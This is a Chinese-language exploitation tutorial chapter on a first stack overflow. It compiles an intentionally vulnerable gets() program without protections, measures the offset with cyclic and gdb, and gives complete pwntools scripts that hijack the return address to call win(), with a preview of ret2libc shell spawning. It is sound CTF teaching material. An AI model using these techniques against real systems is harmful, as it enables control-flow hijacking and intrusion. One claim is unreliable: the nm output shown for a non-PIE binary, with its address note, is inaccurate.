# 第 8 章 栈溢出：第一个漏洞

> 这是你第一次真正「黑掉」一个程序。我们会从一个毫无保护的程序开始，一步步算出偏移、覆盖返回地址、控制程序跳转到我们想要的地方。

---

## 8.1 本章目标

读完本章，你将能够：

- 用 cyclic 模式快速确定溢出偏移量
- 构造 payload 覆盖返回地址
- 用 pwntools 写一个本地利用脚本
- 理解「控制 RIP」意味着什么

## 8.2 一个毫无防备的程序

来看我们的实验对象：

```c
// ret2win.c
#include <stdio.h>
#include <string.h>

void win() {
    printf("Congratulations! You win!\n");
}

void vulnerable() {
    char buf[64];
    puts("Please input something:");
    gets(buf);                     // 漏洞所在：不检查长度
    printf("You said: %s\n", buf);
}

int main() {
    vulnerable();
    return 0;
}
```

程序里有一个 `win()` 函数，它永远不会正常被调用。我们的目标是：**利用栈溢出，让程序执行 `win()`**。

编译（关闭所有保护，方便学习）：

```bash
gcc -g -O0 -no-pie -fno-stack-protector -o ret2win ret2win.c
checksec --file=./ret2win
# NX: NX disabled, Canary: No canary, PIE: No PIE —— 新手村配置
```

正常情况下：

```bash
$ ./ret2win
Please input something:
hello
You said: hello
```

`win()` 永远不会被调用。但从第 6 章我们知道，`buf` 在栈上，后面紧跟着保存的 rbp 和返回地址。如果我们输入足够长的数据，就能覆盖返回地址，让它指向 `win()`。

## 8.3 确定偏移量：cyclic 工具

问题的关键：**需要多少字节才能覆盖到返回地址？**

理论上 `buf[64]` + 8 字节 rbp = 72 字节，但实际可能有对齐填充。所以我们用工具实际测量，而不是靠猜。

### 方法一：pwntools 的 cyclic

```python
from pwn import *

# 生成一个不会重复的字节序列
cyclic(200)
```

`cyclic()` 生成一个由 4 字节块组成的序列，每 4 字节都是唯一的，比如：

```text
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaas...
```

每 4 个字节的规律是：`aaaa` = 0x61616161, `baaa` = 0x62616161, `caaa`... 因为按 4 字节分组，每组的前缀按字母顺序递增，所以从崩溃时的值能反推出偏移量。

**步骤**：让程序崩溃在 cyclic 字符串上，然后看崩溃时的 rip/rbp 值。

```bash
# 生成 200 字节 cyclic 字符串并通过管道传给程序
python3 -c "from pwn import *; print(cyclic(200).decode())" | ./ret2win
```

程序会 Segmentation fault。用 gdb 复现并查看崩溃现场：

```bash
gdb ./ret2win
```

在 gdb 里：

```gdb
run < <(python3 -c "from pwn import *; print(cyclic(200).decode())")
```

或者在 Python 里生成文件：

```bash
python3 -c "from pwn import *; open('cyclic.txt','wb').write(cyclic(200))"
gdb ./ret2win
(gdb) run < cyclic.txt
```

崩溃后看 rip：

```gdb
(gdb) x/gx $rsp
0x7fffffffe118: 0x6261616a
```

或者看 `info registers rip`——如果 rip 变成了类似 `0x6261616a` 这样的值，说明被 cyclic 覆盖了。

然后计算偏移：

```python
from pwn import *
cyclic_find(0x6261616a)   # 返回偏移量，比如 72
```

如果 rip 不是完整的可读值（比如因为覆盖的是 rbp 而不是返回地址），可以看 `$rbp`：

```gdb
(gdb) x/gx $rbp
```

### 方法二：直接用 gdb 观察栈

更直观的方法：在 `gets` 调用后下断点，观察 `buf` 的地址和返回地址的位置。

```gdb
break vulnerable
run
# 单步到 gets 之后
ni ...
# 查看 buf 地址
p &buf
# 查看返回地址位置
p $rbp+8
# 计算偏移量
p ($rbp+8) - &buf
```

这个差值就是偏移量。

## 8.4 控制返回地址

假设我们测得偏移量是 72 字节。payload 的结构就是：

```text
[ 72 字节填充 ][ win() 的地址 ]
```

怎么找到 `win()` 的地址？

```bash
nm ./ret2win | grep win
# 输出示例：0000000000001149 T win
```

或者用 pwntools：

```python
from pwn import *
elf = ELF('./ret2win')
win_addr = elf.symbols['win']
print(hex(win_addr))   # 0x401149（注意 nm 显示的是相对地址，实际是 0x401149）
```

> ⚠️ **注意**：`nm` 输出的地址可能是相对地址（PIE 程序），也可能是绝对地址（非 PIE 程序）。对非 PIE 程序，ELF 的基址是 `0x400000`，所以 `nm` 显示的 `0x1149` 实际地址是 `0x401149`。用 pwntools 的 `elf.symbols` 能直接拿到正确的虚拟地址。

现在构造 payload：

```python
from pwn import *

elf = ELF('./ret2win')
win_addr = elf.symbols['win']

payload = b'A' * 72 + p64(win_addr)

p = process('./ret2win')
p.sendline(payload)
p.interactive()
```

运行这个脚本，你会看到：

```text
Please input something:
You said: AAAA...
Congratulations! You win!
```

你刚刚完成了一次真正的漏洞利用！

### 稍微改进一下

跳转到 `win()` 后，程序会继续执行 `win` 的 ret，而栈上紧接着的内容是什么？是我们的 payload 结束后的数据。如果那里是不可控的，程序可能崩溃。但在 CTF 中，只要 `win()` 打印出 flag 就够了，崩溃无所谓。

如果想让程序优雅地退出或回到 main，可以在 payload 后面加上返回地址：

```python
payload = flat(
    b'A' * 72,
    win_addr,
    elf.symbols['main']   # win 执行完后返回 main
)
```

## 8.5 用 pwntools 写一份规范的 exp

上面的脚本比较粗糙，来看一个「正规」的利用脚本长什么样：

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

# 设置上下文（架构、操作系统、日志级别）
context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'debug'

# 加载二进制
elf = ELF('./ret2win', checksec=False)

# --- 信息收集 ---
offset = 72
win_addr = elf.sym['win']

log.success(f'win address: {hex(win_addr)}')
log.info(f'offset: {offset}')

# --- 构造 payload ---
payload = flat(
    {offset: p64(win_addr)}    # flat 的字典写法：在 offset 处放 win_addr
)

# --- 发送 payload ---
p = process(elf.path)
p.recvuntil(b'Please input something:\n')
p.sendline(payload)

# --- 查看结果 ---
output = p.recvall(timeout=2)
if b'Congratulations' in output:
    log.success('Exploit success!')
else:
    log.error('Exploit failed')

p.close()
```

`flat({offset: value})` 是 pwntools 的一个优雅特性：它会在 payload 的第 `offset` 字节处放置 `value`，前面自动用 `\x00` 或指定字符填充。等价于 `b'A'*offset + value`（如果你想用 'A' 填充，用 `flat({offset: win_addr}, filler=b'A')`）。

## 8.6 从「调用函数」到「控制流劫持」

上面我们让程序调用了 `win()`。但你可能会想：如果程序里没有 `win()` 这样的后门函数怎么办？怎么执行 `system("/bin/sh")`？

答案是：借用 libc 里的 `system` 函数和字符串 `/bin/sh`。这就是下一章（ret2libc）的内容。

但在此之前，先理解一个核心思想：

> **栈溢出的本质不是「让程序崩溃」，而是「控制程序的返回地址，从而控制它的下一条指令」。一旦你能控制 rip，你就能让程序做任何事——前提是程序或它加载的库里有你需要的代码。**

这就是 ROP 的思想来源：把程序里已有的代码片段当作「乐高积木」拼起来，完成你想要的操作。

## 8.7 常见坑

1. **偏移量算错**：最常见的问题。一定要用 cyclic 或 gdb 实际测量，不要只根据数组大小推测。
2. **地址写错**：64 位地址要用 `p64()` 而不是 `p32()`，否则长度不对。
3. **栈对齐问题**：调用某些函数（尤其是 libc 里的）时要求 rsp 16 字节对齐，否则会崩在 `movaps` 指令上。解决方法是在 payload 里插入一个 `ret` gadget 来调整栈对齐（后面章节详讲）。
4. **stdin 缓冲**：`gets` 从 stdin 读取，如果程序有输出缓冲，可能需要在交互时注意时序。`sendline` 会自动加换行符。
5. **本地和远程的差异**：远程服务器可能开 ASLR、用不同的 libc，本地能跑通不代表远程能跑通。
